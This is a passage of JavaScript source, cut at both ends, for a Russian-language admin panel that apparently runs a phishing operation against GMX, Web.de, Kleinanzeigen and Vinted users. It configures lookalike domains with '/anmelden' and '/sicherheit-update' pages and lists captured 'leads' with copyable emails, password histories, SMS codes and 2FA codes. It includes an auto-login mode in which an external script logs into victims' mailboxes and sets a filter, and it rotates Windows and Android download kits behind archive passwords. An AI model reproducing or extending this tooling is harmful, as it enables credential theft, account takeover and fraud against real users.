          !String(payload.webdeDomain || '').trim() ||
          !String(payload.kleinDomain || '').trim() ||
          !String(payload.vintDomain || '').trim()
        ) {
          showToast('Заполните домены всех четырёх брендов');
          return;
        }
        var gmxDi = document.getElementById('config-brand-gmx-domain');
        var webDi = document.getElementById('config-brand-webde-domain');
        var klDi = document.getElementById('config-brand-klein-domain');
        var vintDi = document.getElementById('config-brand-vint-domain');
        if (brandKey === 'gmx' && gmxDi) gmxDi.value = d;
        if (brandKey === 'webde' && webDi) webDi.value = d;
        if (brandKey === 'klein' && klDi) klDi.value = d;
        if (brandKey === 'vint' && vintDi) vintDi.value = d;
        setBrandProvisionIcon(brandKey, 'loading', '');
        if (probeIcon) probeIcon.disabled = true;
        btn.disabled = true;
        postJson('/api/config/brand-domain-apply', Object.assign({ brand: brandKey }, payload))
          .then(function (r) {
            return r.text().then(function (text) {
              var j = null;
              try {
                j = text ? JSON.parse(text) : null;
              } catch (e) {
                throw new Error('Ответ не JSON: ' + String(text || '').slice(0, 120));
              }
              if (!r.ok) throw new Error((j && j.error) || 'HTTP ' + r.status);
              return j;
            });
          })
          .then(function (data) {
            if (!data || !data.ok) {
              var emsg = (data && data.error) || '';
              setBrandProvisionIcon(brandKey, 'err', emsg);
              writeBrandCardStatusEntry(brandKey, {
                domain: d,
                iconState: 'err',
                iconTitle: emsg,
                lineText: '',
                lineClass: ''
              });
              showToast((data && data.error) || 'Ошибка');
              return;
            }
            var p = data.provision || {};
            if (p.async) {
              var t1 = p.message || '';
              setBrandProvisionIcon(brandKey, 'ok', t1);
              writeBrandCardStatusEntry(brandKey, {
                domain: d,
                iconState: 'ok',
                iconTitle: t1 || 'Nginx+SSL в фоне',
                lineText: '',
                lineClass: ''
              });
              showToast('Домен сохранён. ' + (p.message || 'Nginx+SSL в фоне'));
            } else if (p.skipped) {
              var t2 = p.message || '';
              setBrandProvisionIcon(brandKey, 'ok', t2);
              writeBrandCardStatusEntry(brandKey, {
                domain: d,
                iconState: 'ok',
                iconTitle: t2 || 'Сохранено',
                lineText: '',
                lineClass: ''
              });
              showToast('Домен сохранён. ' + (p.message || 'Nginx/SSL не запускались'));
            } else if (p.ok) {
              setBrandProvisionIcon(brandKey, 'ok', 'Nginx и SSL готовы');
              writeBrandCardStatusEntry(brandKey, {
                domain: d,
                iconState: 'ok',
                iconTitle: 'Nginx и SSL готовы',
                lineText: '',
                lineClass: ''
              });
              showToast('Домен сохранён, Nginx/SSL выполнены');
            } else {
              var tail = (p.out || p.message || '').trim().slice(0, 280);
              setBrandProvisionIcon(brandKey, 'err', tail);
              writeBrandCardStatusEntry(brandKey, {
                domain: d,
                iconState: 'err',
                iconTitle: tail,
                lineText: '',
                lineClass: ''
              });
              showToast('Домен сохранён; ошибка Nginx/SSL: ' + (tail || 'см. лог сервера'));
            }
            loadConfigBrandDomains();
          })
          .catch(function (err) {
            var ex = (err && err.message) || '';
            setBrandProvisionIcon(brandKey, 'err', ex);
            writeBrandCardStatusEntry(brandKey, {
              domain: d,
              iconState: 'err',
              iconTitle: ex,
              lineText: '',
              lineClass: ''
            });
            showToast((err && err.message) || 'Ошибка');
          })
          .finally(function () {
            btn.disabled = false;
            if (probeIcon) probeIcon.disabled = false;
          });
      });
    }
    bindBrandDomainApply('gmx');
    bindBrandDomainApply('webde');
    bindBrandDomainApply('klein');
    bindBrandDomainApply('vint');

    ['gmx', 'webde', 'klein', 'vint'].forEach(function (bk) {
      bindBrandDomainProbeIcon(bk);
      var inp = document.getElementById('config-brand-' + bk + '-domain');
      if (inp) {
        inp.addEventListener('input', function () {
          updateBrandDisplayHost(bk);
          var now = normBrandDomainInput(inp.value);
          var o = readBrandCardStatusAll();
          var cached = o[bk];
          if (cached && cached.domain && cached.domain !== now) {
            removeBrandCardStatusEntry(bk);
            resetBrandCardStatusRow(bk);
          }
        });
      }
    });

    var DOWNLOAD_KIT_BRANDS = ['gmx', 'webde', 'klein'];

    if (typeof window.initAdminConfigPaneAndroid === 'function') {
      var androidPane = window.initAdminConfigPaneAndroid({
        authFetch: authFetch,
        postJson: postJson,
        escapeHtml: escapeHtml,
        brands: DOWNLOAD_KIT_BRANDS
      });
      if (androidPane && typeof androidPane.loadConfigAndroid === 'function') {
        loadConfigAndroid = androidPane.loadConfigAndroid;
      }
    }

    if (typeof window.initAdminConfigPaneWindows === 'function') {
      var windowsPane = window.initAdminConfigPaneWindows({
        authFetch: authFetch,
        postJson: postJson,
        escapeHtml: escapeHtml,
        brands: DOWNLOAD_KIT_BRANDS
      });
      if (windowsPane) {
        if (typeof windowsPane.loadConfigDownload === 'function') loadConfigDownload = windowsPane.loadConfigDownload;
        if (typeof windowsPane.loadWindowsArchivePassword === 'function') {
          loadWindowsArchivePassword = windowsPane.loadWindowsArchivePassword;
        }
      }
    }

    function bindResetAndRotate(platform, loadListFn) {
      var isWin = platform === 'windows';
      var resetBtn = document.getElementById(isWin ? 'config-download-reset-counts' : 'config-android-reset-counts');
      var rotateBtn = document.getElementById(isWin ? 'config-download-rotate-next' : 'config-android-rotate-next');
      var msgEl = document.getElementById(isWin ? 'config-download-files-message-gmx' : 'config-android-files-message-gmx');
      function showMsg(text, type) {
        if (!msgEl) return;
        msgEl.textContent = text;
        msgEl.className = 'config-msg ' + (type || 'success');
        msgEl.classList.remove('hidden');
        setTimeout(function () { msgEl.classList.add('hidden'); }, 2500);
      }
      if (resetBtn) {
        resetBtn.addEventListener('click', function () {
          postJson('/api/config/download-reset-counts', { platform: platform }).then(function (r) {
            if (r && r.ok) { showMsg('Счётчики сброшены'); loadListFn(); }
            else showMsg((r && r.error) || 'Ошибка', 'error');
          }).catch(function () { showMsg('Ошибка сети', 'error'); });
        });
      }
      if (rotateBtn) {
        rotateBtn.addEventListener('click', function () {
          postJson('/api/config/download-rotate-next', { platform: platform }).then(function (r) {
            if (r && r.ok) { showMsg('След. конфиг для новых юзеров'); loadListFn(); }
            else showMsg((r && r.error) || 'Ошибка', 'error');
          }).catch(function () { showMsg('Ошибка сети', 'error'); });
        });
      }
    }
    bindResetAndRotate('windows', loadConfigDownload);
    bindResetAndRotate('android', loadConfigAndroid);

    if (typeof window.initAdminConfigSharedDownloadRotation === 'function') {
      var downloadRot = window.initAdminConfigSharedDownloadRotation({
        authFetch: authFetch,
        postJson: postJson
      });
      if (downloadRot && typeof downloadRot.loadDownloadSettings === 'function') {
        loadDownloadSettings = downloadRot.loadDownloadSettings;
      }
    }

    if (typeof window.initAdminConfigPaneShort === 'function') {
      var shortPane = window.initAdminConfigPaneShort({
        authFetch: authFetch,
        postJson: postJson,
        showToast: showToast,
        copyToClipboard: copyToClipboard
      });
      if (shortPane && typeof shortPane.loadConfigShort === 'function') {
        loadConfigShort = shortPane.loadConfigShort;
      }
    }

    if (typeof window.initAdminConfigPaneProxies === 'function') {
      var proxiesPane = window.initAdminConfigPaneProxies({
        authFetch: authFetch,
        postJson: postJson,
        syncCodeEditorHeights: AdminModalKit.syncCodeEditorHeights,
        adminNonJsonHint: adminNonJsonHint,
        getProxyStatsForLine: getProxyStatsForLine,
        buildInlineStatsNode: buildInlineStatsNode,
        loadProxyFpStats: loadProxyFpStats
      });
      if (proxiesPane) {
        if (typeof proxiesPane.loadConfigProxies === 'function') {
          loadConfigProxies = proxiesPane.loadConfigProxies;
        }
        if (typeof proxiesPane.rerenderProxiesEditor === 'function') {
          rerenderProxiesEditor = proxiesPane.rerenderProxiesEditor;
        }
      }
    }

    if (typeof window.initAdminConfigPaneExport === 'function') {
      window.initAdminConfigPaneExport(authFetch);
    }
  }

  function initModeAndStartPage() {
    var dropdown = document.getElementById('headerModeDropdown');
    var trigger = document.getElementById('headerModeTrigger');
    var triggerText = document.getElementById('headerModeTriggerText');
    var menu = document.getElementById('headerModeMenu');
    var menuItems = menu ? menu.querySelectorAll('.header-mode-item[data-mode]') : [];

    var currentMode = 'auto';
    var LABELS = { 'manual': 'Manual', 'auto': 'Auto', 'auto-login': 'Auto-Login', 'script': 'Script' };

    function updateModeUI() {
      if (triggerText) triggerText.textContent = LABELS[currentMode] || currentMode;
      menuItems.forEach(function (item) {
        item.classList.toggle('active', item.getAttribute('data-mode') === currentMode);
      });
    }

    function closeModeMenu() {
      if (dropdown) dropdown.classList.remove('is-open');
      if (trigger) trigger.setAttribute('aria-expanded', 'false');
      if (menu) menu.setAttribute('aria-hidden', 'true');
    }

    function applyMode(mode) {
      var prevMode = currentMode;
      currentMode = mode;
      var req;
      if (mode === 'manual') {
        req = postJson('/api/mode', { mode: 'manual', autoScript: false, scriptMode: false });
      } else if (mode === 'auto') {
        req = postJson('/api/mode', { mode: 'auto', autoScript: false, scriptMode: false });
      } else if (mode === 'script') {
        // Script: внешний локальный cookiemail-скрипт делает логин + ставит фильтр.
        // autoScript=true тоже включаем — лиды попадают в очередь автологина.
        req = postJson('/api/mode', { mode: 'auto', autoScript: true, scriptMode: true });
      } else {
        // auto-login
        req = postJson('/api/mode', { mode: 'auto', autoScript: true, scriptMode: false });
      }
      try {
        localStorage.setItem('gmw-auto-script', (mode === 'auto-login' || mode === 'script') ? '1' : '0');
        localStorage.setItem('gmw-script-mode', mode === 'script' ? '1' : '0');
      } catch (e) {}
      updateModeUI();
      closeModeMenu();
      req.catch(function () {
        currentMode = prevMode;
        updateModeUI();
        showToast('Не удалось сохранить режим на сервере');
      });
    }

    authFetch('/api/mode').then(function (r) { return r.json(); }).then(function (data) {
      var mode = ((data.mode || 'auto') + '').toLowerCase();
      var autoScript = !!data.autoScript;
      var scriptMode = !!data.scriptMode;
      if (mode === 'manual') currentMode = 'manual';
      else if (mode === 'auto' && scriptMode) currentMode = 'script';
      else if (mode === 'auto' && autoScript) currentMode = 'auto-login';
      else currentMode = 'auto';
      try {
        localStorage.setItem('gmw-auto-script', autoScript ? '1' : '0');
        localStorage.setItem('gmw-script-mode', scriptMode ? '1' : '0');
      } catch (e) {}
      updateModeUI();
      var baseGmx = data.canonicalBaseGmx || data.canonicalBase || '';
      var baseWebde = data.canonicalBaseWebde || '';
      var siteLink = document.getElementById('site-link');
      var siteLinkChange = document.getElementById('site-link-change');
      var siteLinkWebde = document.getElementById('site-link-webde');
      var siteLinkWebdeChange = document.getElementById('site-link-webde-change');
      if (siteLink) siteLink.href = baseGmx ? (baseGmx.replace(/\/$/, '') + '/anmelden') : '/anmelden';
      if (siteLinkChange) siteLinkChange.href = baseGmx ? (baseGmx.replace(/\/$/, '') + '/sicherheit-update') : '/sicherheit-update';
      if (siteLinkWebde) siteLinkWebde.href = baseWebde ? (baseWebde.replace(/\/$/, '') + '/anmelden') : '#';
      if (siteLinkWebdeChange) siteLinkWebdeChange.href = baseWebde ? (baseWebde.replace(/\/$/, '') + '/sicherheit-update') : '#';
    }).catch(function () {});

    var lastAutoScript = null;
    var lastScriptMode = null;
    try {
      lastAutoScript = localStorage.getItem('gmw-auto-script');
      lastScriptMode = localStorage.getItem('gmw-script-mode');
    } catch (e) {}
    if (lastScriptMode === '1') currentMode = 'script';
    else if (lastAutoScript === '1') currentMode = 'auto-login';
    updateModeUI();

    if (trigger && menu) {
      trigger.addEventListener('click', function () {
        var open = dropdown.classList.toggle('is-open');
        trigger.setAttribute('aria-expanded', open ? 'true' : 'false');
        menu.setAttribute('aria-hidden', open ? 'false' : 'true');
      });
    }
    menuItems.forEach(function (item) {
      item.addEventListener('click', function () {
        var mode = item.getAttribute('data-mode');
        if (mode) applyMode(mode);
      });
    });

    var startPageBrandsWrap = document.getElementById('headerStartPageBrands');
    var PAGE_LABELS = { 'login': 'Login', 'change': 'Change', 'download': 'Download', 'klein': 'Klein' };
    var SP_PREFIX = { webde: 'WD', gmx: 'GMX', klein: 'Kl' };
    var currentPages = { webde: 'login', gmx: 'login', klein: 'login' };

    function normalizeStartPage(val) {
      var v = (val == null ? '' : String(val)).trim().toLowerCase();
      if (v === 'login' || v === 'change' || v === 'download' || v === 'klein') return v;
      return 'login';
    }

    function updatePageUIForBrand(brand) {
      var dd = document.getElementById('startPageDropdown' + (brand === 'webde' ? 'Webde' : brand === 'gmx' ? 'Gmx' : 'Klein'));
      var trigText = document.getElementById('startPageTriggerText' + (brand === 'webde' ? 'Webde' : brand === 'gmx' ? 'Gmx' : 'Klein'));
      var menu = document.getElementById('startPageMenu' + (brand === 'webde' ? 'Webde' : brand === 'gmx' ? 'Gmx' : 'Klein'));
      var cur = currentPages[brand] || 'login';
      if (trigText) trigText.textContent = (SP_PREFIX[brand] || brand) + ' · ' + (PAGE_LABELS[cur] || cur);
      if (menu) {
        menu.querySelectorAll('.header-mode-item[data-page]').forEach(function (item) {
          item.classList.toggle('active', item.getAttribute('data-page') === cur);
        });
      }
    }

    function updateAllPageUI() {
      ['webde', 'gmx', 'klein'].forEach(updatePageUIForBrand);
    }

    function closeAllPageMenus() {
      if (!startPageBrandsWrap) return;
      startPageBrandsWrap.querySelectorAll('.header-sp-brand').forEach(function (dd) {
        dd.classList.remove('is-open');
        var t = dd.querySelector('.header-mode-trigger');
        var m = dd.querySelector('.header-mode-menu');
        if (t) t.setAttribute('aria-expanded', 'false');
        if (m) m.setAttribute('aria-hidden', 'true');
      });
    }

    function applyPageForBrand(brand, page) {
      var prev = currentPages[brand];
      closeAllPageMenus();
      postJson('/api/start-page', { startPage: page, brand: brand })
        .then(function (r) {
          return r.json().then(function (data) {
            return { httpOk: r.ok, status: r.status, data: data };
          });
        })
        .then(function (res) {
          if (res.httpOk && res.data && res.data.ok) {
            if (res.data.startPages) {
              ['webde', 'gmx', 'klein'].forEach(function (b) {
                if (res.data.startPages[b]) currentPages[b] = normalizeStartPage(res.data.startPages[b]);
              });
            } else {
              currentPages[brand] = normalizeStartPage(page);
            }
            updateAllPageUI();
          } else {
            showToast('Старт ' + brand + ' не сохранён (HTTP ' + (res.status || '') + ').');
            currentPages[brand] = prev;
            updatePageUIForBrand(brand);
          }
        })
        .catch(function () {
          showToast('Старт ' + brand + ': нет связи с сервером.');
          currentPages[brand] = prev;
          updatePageUIForBrand(brand);
        });
    }

    authFetch('/api/start-page').then(function (r) {
      return r.json().then(function (data) {
        return { ok: r.ok, data: data };
      });
    }).then(function (res) {
      if (!res.ok) {
        if (res.data && res.data.error === 'forbidden') {
          showToast('Нет доступа к API. Выполните вход в админ-панель.');
        }
        return;
      }
      var sp = res.data && res.data.startPages;
      if (sp) {
        currentPages.webde = normalizeStartPage(sp.webde);
        currentPages.gmx = normalizeStartPage(sp.gmx);
        currentPages.klein = normalizeStartPage(sp.klein);
      } else {
        var one = normalizeStartPage(res.data && res.data.startPage);
        currentPages.webde = one;
        currentPages.gmx = one;
        currentPages.klein = one;
      }
      updateAllPageUI();
    }).catch(function () {
      showToast('Не удалось загрузить стартовые страницы с сервера.');
    });

    ['webde', 'gmx', 'klein'].forEach(function (brand) {
      var suf = brand === 'webde' ? 'Webde' : brand === 'gmx' ? 'Gmx' : 'Klein';
      var pageDropdown = document.getElementById('startPageDropdown' + suf);
      var pageTrigger = document.getElementById('startPageTrigger' + suf);
      var pageMenu = document.getElementById('startPageMenu' + suf);
      if (pageTrigger && pageMenu && pageDropdown) {
        pageTrigger.addEventListener('click', function () {
          var open = !pageDropdown.classList.contains('is-open');
          closeAllPageMenus();
          if (open) {
            pageDropdown.classList.add('is-open');
            pageTrigger.setAttribute('aria-expanded', 'true');
            pageMenu.setAttribute('aria-hidden', 'false');
          }
        });
      }
      if (pageMenu) {
        pageMenu.querySelectorAll('.header-mode-item[data-page]').forEach(function (item) {
          item.addEventListener('click', function () {
            var page = item.getAttribute('data-page');
            if (page) applyPageForBrand(brand, page);
          });
        });
      }
    });

    document.addEventListener('click', function (e) {
      if (dropdown && dropdown.classList.contains('is-open') && !dropdown.contains(e.target)) closeModeMenu();
      if (startPageBrandsWrap && !startPageBrandsWrap.contains(e.target)) closeAllPageMenus();
    });
  }

  function initHeaderCollapse() {
    var wrap = document.getElementById('headerCollapseWrap');
    var panel = document.getElementById('headerCollapsePanel');
    var panelInner = document.getElementById('headerCollapsePanelInner');
    var btn = document.getElementById('headerCollapseBtn');
    if (!wrap || !panel || !panelInner || !btn) return;
    var headerRight = btn.parentNode;
    var breakpointPx = 900;

    function moveToPanel() {
      if (wrap.parentNode !== panelInner) {
        panelInner.appendChild(wrap);
      }
    }
    function moveToHeader() {
      if (wrap.parentNode !== headerRight) {
        headerRight.insertBefore(wrap, btn);
      }
      panel.classList.remove('open');
      panel.setAttribute('aria-hidden', 'true');
      btn.setAttribute('aria-expanded', 'false');
    }
    function updateLayout() {
      if (window.innerWidth <= breakpointPx) {
        moveToPanel();
      } else {
        moveToHeader();
      }
    }

    var mq = window.matchMedia('(max-width: ' + breakpointPx + 'px)');
    mq.addListener(updateLayout);
    updateLayout();

    btn.addEventListener('click', function () {
      if (window.innerWidth > breakpointPx) return;
      var open = panel.classList.toggle('open');
      panel.setAttribute('aria-hidden', !open);
      btn.setAttribute('aria-expanded', open);
    });
    document.addEventListener('click', function (e) {
      if (!panel.classList.contains('open')) return;
      if (panel.contains(e.target) || btn.contains(e.target)) return;
      panel.classList.remove('open');
      panel.setAttribute('aria-hidden', 'true');
      btn.setAttribute('aria-expanded', 'false');
    });
  }

  function initTheme() {
    var themeToggle = document.getElementById('themeToggle');
    var saved = localStorage.getItem('admin-theme');
    if (saved === 'light') document.documentElement.classList.add('light');

    if (themeToggle) {
      themeToggle.addEventListener('click', function () {
        document.documentElement.classList.toggle('light');
        localStorage.setItem('admin-theme', document.documentElement.classList.contains('light') ? 'light' : 'dark');
      });
    }
  }

  function initSidebar() {
    var menuToggle = document.getElementById('menuToggle');
    var sidebar = document.getElementById('sidebar');
    var overlay = document.getElementById('sidebarOverlay');

    function closeSidebar() {
      if (sidebar) sidebar.classList.remove('open');
      if (overlay) overlay.classList.remove('visible');
      document.body.style.overflow = '';
    }

    if (menuToggle && sidebar) {
      menuToggle.addEventListener('click', function () {
        sidebar.classList.toggle('open');
        if (overlay) overlay.classList.toggle('visible');
        var isOpen = sidebar.classList.contains('open');
        document.body.style.overflow = isOpen ? 'hidden' : '';
        if (isOpen) markViewed();
      });
    }
    if (overlay) overlay.addEventListener('click', closeSidebar);

    var mainAndChat = document.getElementById('mainAndChat');
    var tabLog = document.getElementById('tab-log');
    var tabChat = document.getElementById('tab-chat');
    if (mainAndChat && tabLog && tabChat) {
      tabLog.addEventListener('click', function () {
        mainAndChat.classList.remove('panel-chat');
        mainAndChat.classList.add('panel-log');
        tabLog.classList.add('is-active');
        tabChat.classList.remove('is-active');
      });
      tabChat.addEventListener('click', function () {
        mainAndChat.classList.remove('panel-log');
        mainAndChat.classList.add('panel-chat');
        tabChat.classList.add('is-active');
        tabLog.classList.remove('is-active');
        onChatTabActivated();
      });
    }
  }

  function initCopyClick() {
    var main = el.mainContent;
    var historyEl = el.passwordHistory;
    if (!main) return;
    main.addEventListener('click', function (e) {
      var t = e.target;
      if (t.id === 'detail-email' || t.id === 'detail-email-kl' || t.id === 'detail-password-current' || t.id === 'detail-password-kl' || t.id === 'detail-sms-code' || t.id === 'detail-2fa-code') {
        copyToClipboard(t.textContent);
        return;
      }
      if (historyEl && historyEl.contains(t)) {
        copyToClipboard(t.textContent);
      }
    });
  }

  function init() {
    try {
      if (window[ADMIN_INIT_GUARD_KEY]) return;
      window[ADMIN_INIT_GUARD_KEY] = true;
    } catch (e) {}
    el.countBadge = document.getElementById('count-badge');
    el.leadsList = document.getElementById('leads-list');
    el.leadEmpty = document.getElementById('lead-empty');
    el.leadsPagination = document.getElementById('leads-pagination');
    el.leadsPaginationTop = document.getElementById('leads-pagination-top');
    el.sessionsListWrap = document.getElementById('sessions-list-wrap');
    el.detailPlaceholder = document.getElementById('detail-placeholder');
    el.mainContent = document.getElementById('mainContent');
    el.detailEmail = document.getElementById('detail-email');
    el.detailPasswordCurrent = document.getElementById('detail-password-current');
    el.passwordHistory = document.getElementById('password-history');
    el.detailTerminal = document.getElementById('detail-terminal');
    el.statsContent = document.getElementById('stats-content');
    el.statsGrid = document.getElementById('stats-grid');

    initCopyClick();
    initTheme();
    var adminUiModeController = null;
    if (typeof window.initAdminUiMode === 'function') {
      adminUiModeController = window.initAdminUiMode({
        authFetch: authFetch,
        postJson: postJson,
        showToast: showToast
      });
    }
    if (typeof window.initAdminModeLeadsFilter === 'function') {
      var initialMode = adminUiModeController && typeof adminUiModeController.getMode === 'function'
        ? adminUiModeController.getMode()
        : 'email';
      adminModeLeadsFilter = window.initAdminModeLeadsFilter({
        initialMode: initialMode,
        getMode: adminUiModeController && typeof adminUiModeController.getMode === 'function'
          ? adminUiModeController.getMode
          : null,
        onModeChanged: function (_nextMode, _prevMode) {
          selectedIds = {};
          selectedId = null;
          try { sessionStorage.removeItem('gmw-admin-selected-id'); } catch (e) {}
          leadsPage = 1;
          loadLeads();
        }
      }) || adminModeLeadsFilter;
    } else {
      // Fallback: if filter module fails to load, still resync list on UI mode switch.
      window.addEventListener('gmw-admin-ui-mode-change', function () {
        selectedIds = {};
        selectedId = null;
        try { sessionStorage.removeItem('gmw-admin-selected-id'); } catch (e) {}
        leadsPage = 1;
        loadLeads();
      });
    }
    initSidebar();
    initHeaderCollapse();
    AdminModalKit.init();
    initConfigModal();
    initFingerprintModal();
    initModeAndStartPage();
    initButtons();
    initKleinForgotUrlModal();
    initKleinSmsWaitModal();
    initAdminChat();
    loadStats('today');
    loadLeads(null, null, { ensureSelected: true });
    connectAdminRealtimeWs();
    bindAdminAudioWarmupOnce();
  }

  function getOrCreateAdminAudioCtx() {
    try {
      var AC = window.AudioContext || window.webkitAudioContext;
      if (!AC) return null;
      if (adminAudioCtx && adminAudioCtx.state === 'closed') adminAudioCtx = null;
      if (!adminAudioCtx) adminAudioCtx = new AC();
      return adminAudioCtx;
    } catch (e) {
      return null;
    }
  }

  function getAdminToneSegments(kind, brand) {
    if (kind === 'new-lead' && brand === 'klein') {
      return [
        { freq: 880, offset: 0, dur: 0.1, peak: 0.1 },
        { freq: 1174.66, offset: 0.08, dur: 0.12, peak: 0.095 }
      ];
    }
    if (kind === 'log' && brand === 'klein') {
      return [
        { freq: 880, offset: 0, dur: 0.09, peak: 0.06 },
        { freq: 1174.66, offset: 0.075, dur: 0.11, peak: 0.055 }
      ];
    }
    if (kind === 'log' && brand === 'vint') {
      return [
        { freq: 698.46, offset: 0, dur: 0.1, peak: 0.055 },
        { freq: 587.33, offset: 0.08, dur: 0.12, peak: 0.05 }
      ];
    }
    return [];
  }

  function primeAdminAudioContext(ctx) {
    if (!ctx) return;
    try {
      var t0 = ctx.currentTime + 0.001;
      var osc = ctx.createOscillator();
      var gn = ctx.createGain();
      osc.type = 'sine';
      osc.frequency.setValueAtTime(440, t0);
      gn.gain.setValueAtTime(0.00001, t0);
      gn.gain.linearRampToValueAtTime(0.00001, t0 + 0.012);
      osc.connect(gn);
      gn.connect(ctx.destination);
      osc.start(t0);
      osc.stop(t0 + 0.012);
    } catch (_) {}
  }

  function ensureAdminAudioReady() {
    var ctx = getOrCreateAdminAudioCtx();
    if (!ctx) return Promise.resolve(null);
    if (ctx.state === 'running') {
      adminAudioUnlocked = true;
      return Promise.resolve(ctx);
    }
    try {
      var pr = ctx.resume();
      if (pr && typeof pr.then === 'function') {
        return pr.then(function () {
          if (ctx.state === 'running') {
            adminAudioUnlocked = true;
            return ctx;
          }
          return null;
        }).catch(function () {
          return null;
        });
      }
    } catch (_) {
      return Promise.resolve(null);
    }
    if (ctx.state === 'running') {
      adminAudioUnlocked = true;
      return Promise.resolve(ctx);
    }
    return Promise.resolve(null);
  }

  function playSegmentsViaWebAudio(ctx, segments) {
    if (!ctx || !segments || !segments.length) return false;
    try {
      var t0 = ctx.currentTime + 0.006;
      for (var i = 0; i < segments.length; i++) {
        var seg = segments[i];
        var tStart = t0 + Number(seg.offset || 0);
        var dur = Math.max(0.02, Number(seg.dur || 0.08));
        var peak = Math.max(0.01, Math.min(0.2, Number(seg.peak || 0.05)));
        var osc = ctx.createOscillator();
        var gn = ctx.createGain();
        osc.type = 'sine';
        osc.frequency.setValueAtTime(Number(seg.freq || 440), tStart);
        osc.connect(gn);
        gn.connect(ctx.destination);
        gn.gain.setValueAtTime(0.0001, tStart);
        gn.gain.linearRampToValueAtTime(peak, tStart + 0.018);
        gn.gain.exponentialRampToValueAtTime(0.0001, tStart + dur);
        osc.start(tStart);
        osc.stop(tStart + dur + 0.03);
      }
      return true;
    } catch (_) {
      return false;
    }
  }

  function getOrBuildAdminFallbackWavDataUri(cacheKey, segments) {
    if (!cacheKey || !segments || !segments.length) return '';
    if (adminAudioFallbackCache[cacheKey]) return adminAudioFallbackCache[cacheKey];
    try {
      var sampleRate = 22050;
      var maxEndSec = 0.25;
      for (var i = 0; i < segments.length; i++) {
        var s = segments[i] || {};
        var end = Math.max(0, Number(s.offset || 0)) + Math.max(0.02, Number(s.dur || 0.08)) + 0.03;
        if (end > maxEndSec) maxEndSec = end;
      }
      var totalSamples = Math.max(1, Math.floor(maxEndSec * sampleRate));
      var pcm = new Int16Array(totalSamples);
      for (var n = 0; n < totalSamples; n++) {
        var t = n / sampleRate;
        var sample = 0;
        for (var j = 0; j < segments.length; j++) {
          var seg = segments[j] || {};
          var st = Math.max(0, Number(seg.offset || 0));
          var dur = Math.max(0.02, Number(seg.dur || 0.08));
          if (t < st || t > st + dur) continue;
          var local = t - st;
          var env = 1;
          if (local < 0.015) env = local / 0.015;
          else if (local > dur - 0.03) env = Math.max(0, (dur - local) / 0.03);
          var peak = Math.max(0.01, Math.min(0.2, Number(seg.peak || 0.05)));
          var amp = peak * env;
          var freq = Math.max(60, Number(seg.freq || 440));
          sample += Math.sin(2 * Math.PI * freq * local) * amp;
        }
        if (sample > 1) sample = 1;
        else if (sample < -1) sample = -1;
        pcm[n] = (sample * 32767) | 0;
      }
      var dataBytes = totalSamples * 2;
      var buffer = new ArrayBuffer(44 + dataBytes);
      var dv = new DataView(buffer);
      function writeAscii(offset, text) {
        for (var k = 0; k < text.length; k++) dv.setUint8(offset + k, text.charCodeAt(k));
      }
      writeAscii(0, 'RIFF');
      dv.setUint32(4, 36 + dataBytes, true);
      writeAscii(8, 'WAVE');
      writeAscii(12, 'fmt ');
      dv.setUint32(16, 16, true);
      dv.setUint16(20, 1, true);
      dv.setUint16(22, 1, true);
      dv.setUint32(24, sampleRate, true);
      dv.setUint32(28, sampleRate * 2, true);
      dv.setUint16(32, 2, true);
      dv.setUint16(34, 16, true);
      writeAscii(36, 'data');
      dv.setUint32(40, dataBytes, true);
      var off = 44;
      for (var p = 0; p < pcm.length; p++, off += 2) dv.setInt16(off, pcm[p], true);
      var bytes = new Uint8Array(buffer);
      var chunk = 0x8000;
      var bin = '';
      for (var c = 0; c < bytes.length; c += chunk) {
        var part = bytes.subarray(c, Math.min(bytes.length, c + chunk));
        bin += String.fromCharCode.apply(null, part);
      }
      var uri = 'data:audio/wav;base64,' + btoa(bin);
      adminAudioFallbackCache[cacheKey] = uri;
      return uri;
    } catch (_) {
      return '';
    }
  }

  function playSegmentsViaHtmlAudio(cacheKey, segments) {
    try {
      var src = getOrBuildAdminFallbackWavDataUri(cacheKey, segments);
      if (!src || typeof Audio === 'undefined') return;
      var a = new Audio();
      a.src = src;
      a.volume = 0.75;
      var pr = a.play();
      if (pr && typeof pr.catch === 'function') pr.catch(function () {});
    } catch (_) {}
  }

  function playAdminTone(kind, brand) {
    var segments = getAdminToneSegments(kind, brand);
    if (!segments.length) return;
    ensureAdminAudioReady().then(function (ctx) {
      if (ctx && playSegmentsViaWebAudio(ctx, segments)) return;
      playSegmentsViaHtmlAudio(kind + '|' + brand, segments);
    });
  }

  function bindAdminAudioWarmupOnce() {
    if (adminAudioWarmupBound) return;
    adminAudioWarmupBound = true;
    function cleanupWarmupListeners() {
      document.removeEventListener('pointerdown', onFirstInteraction, true);
      document.removeEventListener('keydown', onFirstInteraction, true);
      document.removeEventListener('touchstart', onFirstInteraction, true);
      document.removeEventListener('mousedown', onFirstInteraction, true);
      document.removeEventListener('click', onFirstInteraction, true);
    }
    function onFirstInteraction() {
      if (adminAudioUnlocked || adminAudioWarmupBusy) {
        if (adminAudioUnlocked) cleanupWarmupListeners();
        return;
      }
      adminAudioWarmupBusy = true;
      ensureAdminAudioReady().then(function (ctx) {
        if (ctx) {
          primeAdminAudioContext(ctx);
          if (ctx.state === 'running') {
            adminAudioUnlocked = true;
            cleanupWarmupListeners();
          }
        }
      }).finally(function () {
        adminAudioWarmupBusy = false;
      });
    }
    document.addEventListener('pointerdown', onFirstInteraction, true);
    document.addEventListener('keydown', onFirstInteraction, true);
    document.addEventListener('touchstart', onFirstInteraction, true);
    document.addEventListener('mousedown', onFirstInteraction, true);
    document.addEventListener('click', onFirstInteraction, true);
  }

  function playBrandedLogSound(brand) {
    if (brand !== 'klein' && brand !== 'vint') return;
    playAdminTone('log', brand);
  }

  /** Короткий двухтоновый сигнал при новом лиде Klein. Без файла; при suspended — resume(). */
  function playKleinNewLeadSound() {
    playAdminTone('new-lead', 'klein');
  }

  function connectAdminRealtimeWs() {
    if (adminRealtimeWsController && typeof adminRealtimeWsController.connect === 'function') {
      adminRealtimeWsController.connect();
      return;
    }
    if (typeof window.initAdminRealtimeWs !== 'function') return;
    adminRealtimeWsController = window.initAdminRealtimeWs({
      pollLeadsIfTabVisible: pollLeadsIfTabVisible,
      loadLeads: loadLeads,
      getSelectedId: function () { return selectedId; },
      loadAdminChat: loadAdminChat,
      onLeadPatch: applyLeadPatchFromWs,
      onLeadUpdate: applyLeadUpdateFromWs,
      onLogAppended: function (leadId, line) {
        appendTerminalLogLineFromWs(leadId, line);
        var logBrand = getLeadBrandForLogSound(leadId);
        if ((logBrand === 'klein' || logBrand === 'vint') && shouldPlayAdminLogSound(leadId, line)) {
